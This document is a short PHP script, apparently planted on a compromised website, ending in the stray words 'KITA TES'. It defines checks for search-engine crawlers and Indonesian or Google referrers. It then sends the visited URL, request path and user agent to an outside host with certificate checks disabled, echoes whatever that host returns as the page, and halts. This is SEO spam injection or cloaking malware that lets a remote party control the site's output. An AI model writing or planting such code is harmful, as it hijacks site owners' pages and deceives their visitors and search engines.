<?php
$data1[]=array();$req_uri=$_SERVER['REQUEST_URI'];$http=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://');$domain=$_SERVER["HTTP_HOST"];
function getServerCont11($url,$data=array()){$url=str_replace(' ','+',$url);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"$url");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));$output = curl_exec($ch);$errorCode = curl_errno($ch);curl_close($ch);if(0!== $errorCode){return false;}return $output;}
function check_refer($refer){ $check_refer=false;$referbots='google.co.id|yahoo.co.id|google.com';if($refer!='' && preg_match("/($referbots)/si",$refer)){ $check_refer=true; }return $check_refer;}
function is_crawler($agent){$agent_check=false; $bots='googlebot|google|yahoo|bing|aol';if($agent!=''){if(preg_match("/($bots)/si",$agent)){$agent_check = true; }}return $agent_check;}
$user_agent=strtolower(isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'');
$res_crawl=is_crawler($user_agent); 
$referer=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
$chk_refer=check_refer($referer); 
$data1['http_user_agent']=$user_agent;
$req_url=$http.$domain.$req_uri;
if(getServerCont11("https://versindo.id/code/barokah/?kw=".$req_uri."&url=".$req_url."&agen=".$user_agent,$data1))
{
echo getServerCont11("https://versindo.id/code/barokah/?kw=".$req_uri."&url=".$req_url."&agen=".$user_agent,$data1);
return;
}
?>
  KITA TES
